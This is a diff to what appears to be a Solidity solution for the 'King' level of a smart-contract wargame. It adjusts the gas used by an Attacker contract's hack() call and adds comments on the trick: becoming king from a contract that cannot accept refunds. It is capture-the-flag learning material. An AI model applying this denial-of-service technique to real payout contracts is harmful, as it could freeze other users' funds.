@@ -8,7 +8,7 @@ On such an event, the overthrown king gets paid the new prize, making a bit of e
 When you submit the instance back to the level, the level is going to reclaim kingship. 
 You will beat the level if you can avoid such a self proclamation.*/
 //0xAAA258f4Da8B9d6Dc122e447e1E4e8185039BbbD
-//0xB83088Db6b3a15925CEeE1AaC9fd82965d4b43d3
+//0x22FB08297C5d09a3c94a3Dc0Dce185597D51bB7D
 
 contract King {
 
@@ -37,6 +37,7 @@ contract King {
 //solution:
 //  send eth from contract and exclude the possibility to receive funds from King contract
 //  Important: contract-to-contract TX has a default gas: 2300, not enough to change the storage
+//  More Important: you need to set higher gaslimit in the Metamask for the TX as well
 
 contract Attacker {
 
@@ -69,7 +70,7 @@ contract Attacker {
   }
 
   function hack(uint256 amount) public {
-    payable(_target).call{gas: 3000000, value: amount}("");
+    payable(_target).call{gas: 5000000, value: amount}("");
   }
 
   modifier OnlyOwner() {
